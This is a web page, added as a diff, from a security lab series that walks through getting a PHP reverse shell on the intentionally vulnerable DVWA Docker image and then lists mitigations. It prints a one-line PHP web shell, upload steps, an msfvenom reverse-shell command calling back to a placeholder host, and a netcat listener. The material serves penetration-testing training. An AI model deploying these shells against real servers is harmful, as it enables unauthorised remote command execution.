@@ -1,0 +1,215 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PHP Reverse shell &mdash; Celestial Security Labs R1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=8f9ffe49" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../_static/dark_mode_css/general.css?v=c0a7eb24" />
+      <link rel="stylesheet" type="text/css" href="../_static/dark_mode_css/dark.css?v=70edf1c7" />
+
+  
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=3b1ff954"></script>
+      <script src="../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
+      <script src="../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="prev" title="Labs" href="../index.html" />
+    <link href="../_static/custom.css" rel="stylesheet" type="text/css">
+
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            Celestial Security Labs
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Practice Labs</span></p>
+<ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="#">PHP Reverse shell</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#introduction">Introduction</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#setup">Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#create-a-payload">Create a payload</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-msfvenom-to-create-a-more-complex-payload">Using MSFVenom to create a more complex payload</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#mitigate-this-attack-vector">Mitigate this Attack Vector</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#references">References</a></li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Celestial Security Labs</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">PHP Reverse shell</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/reverse_shell/php reverse shell.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="php-reverse-shell">
+<h1>PHP Reverse shell<a class="headerlink" href="#php-reverse-shell" title="Link to this heading"></a></h1>
+<p>Date: 2025-01-29 07:44:47</p>
+<p>Status: #draft</p>
+<p>Tags: <a class="reference internal" href="../index.html#labs"><span class="std std-ref">Labs</span></a></p>
+<section id="introduction">
+<h2>Introduction<a class="headerlink" href="#introduction" title="Link to this heading"></a></h2>
+<p>One would think that modern installations have secured their implementation, however since this tasks
+is left up to humans, we find many installations that have not been updated, and or secured.</p>
+<p>This lab series documents approaches for various technologies.  Today, we are targeting an unsecured PHP
+installation.</p>
+</section>
+<section id="setup">
+<h2>Setup<a class="headerlink" href="#setup" title="Link to this heading"></a></h2>
+<p>For the target I am using a docker image from: <a class="reference external" href="https://github.com/opsxcq/docker-vulnerable-dvwa">https://github.com/opsxcq/docker-vulnerable-dvwa</a>
+It is an image with the intent of helping students learn about securing web installations.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>:80<span class="w"> </span>vulnerables/web-dvwa
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Login to the site with <a class="reference external" href="http://your_docker_IP">http://your_docker_IP</a> with the credentials <cite>admin/password</cite></p></li>
+<li><p>Click the bottom button (create/reset) to finish the installation</p></li>
+<li><p>Login again with the above credentials</p></li>
+</ul>
+<p>How this vulnerability is leveraged is by a server that allows the system command to be used in PHP.  Modern versions have
+this disabled by default, by older installations, or installations that require this command to be
+available may have this set to on.</p>
+<p>From <cite>/etc/php.ini</cite></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">disable_functions =exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span>
+</pre></div>
+</div>
+<p>By removing the system function from this comma delimited list, you will enable the system command after the
+next service restart.  This tutorial will focus on the system command, but as you can see there are many options.</p>
+</section>
+<section id="create-a-payload">
+<h2>Create a payload<a class="headerlink" href="#create-a-payload" title="Link to this heading"></a></h2>
+<p>We are going to create a payload (a file) to upload the server and see if we can run system commands.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mkdir -P ~/labs/shells</span>
+<span class="go">cd ~/labs/shells</span>
+<span class="go">echo &#39;&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&#39; &gt; shell.php</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Upload the shell by using the left menu and choosing <cite>File Upload</cite> and upload your created script.</p></li>
+<li><p>The created file gets stored on the target in /hackable/uploads</p></li>
+</ul>
+<p>Navigate to the url: <a class="reference external" href="http://172.17.0.2/hackable/uploads/shell.php?cmd=whoami">http://172.17.0.2/hackable/uploads/shell.php?cmd=whoami</a> and you should see
+<cite>www-data</cite>.  This is the output of the command whoami.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>the cmd is the GET variable name you use as the request in your script, and the argument is
+whoami, you can also use other system commands such as ls or cat as examples.</p>
+</div>
+</section>
+<section id="using-msfvenom-to-create-a-more-complex-payload">
+<h2>Using MSFVenom to create a more complex payload<a class="headerlink" href="#using-msfvenom-to-create-a-more-complex-payload" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Prerequisite is to have metasploit installed.</p></li>
+<li><p>Substitute your IP with the &lt;HOST_IP&gt; tag</p></li>
+</ul>
+<p><strong>Step 1</strong> Create a reverse shell with metasploit</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p php/reverse_php LHOST=&lt;HOST_IP&gt; LPORT=1234 -f raw &gt; reverse.php</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Upload the shell by using the left menu and choosing <cite>File Upload</cite> and upload your created script.</p></li>
+<li><p>The created file gets stored on the target in /hackable/uploads</p></li>
+</ul>
+<p><strong>Step 2</strong> Create a listener on your host machine with netcat</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -lnvp 1234</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Execute the remote reverse shell by requesting the script : <a class="reference external" href="http:/">http:/</a>/&lt;HOST_IP&gt;/hackable/uploads/reverse.php</p></li>
+<li><p>You should see a connection on your nc -lnvp 1234 output</p></li>
+</ul>
+</section>
+<section id="mitigate-this-attack-vector">
+<h2>Mitigate this Attack Vector<a class="headerlink" href="#mitigate-this-attack-vector" title="Link to this heading"></a></h2>
+<p>The most effective way to protect against this type of attack:</p>
+<ul class="simple">
+<li><p>Adding system style commands to the disable_function list</p></li>
+<li><p>Restricting uploads when not necessary</p></li>
+<li><p>Checking file uploads for malicious content</p></li>
+<li><p>Allowing only approved file extensions from being processed.</p></li>
+<li><p>Using a WAF</p></li>
+</ul>
+</section>
+<section id="references">
+<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>PHP System commands: <a class="reference external" href="https://www.php.net/manual/en/function.system.php">https://www.php.net/manual/en/function.system.php</a></p></li>
+<li><p>How to disable commands: <a class="reference external" href="https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/">https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/</a></p></li>
+<li><p>Alternate shells: <a class="reference external" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="../index.html" class="btn btn-neutral float-left" title="Labs" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2024, CelestialTech.ca.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
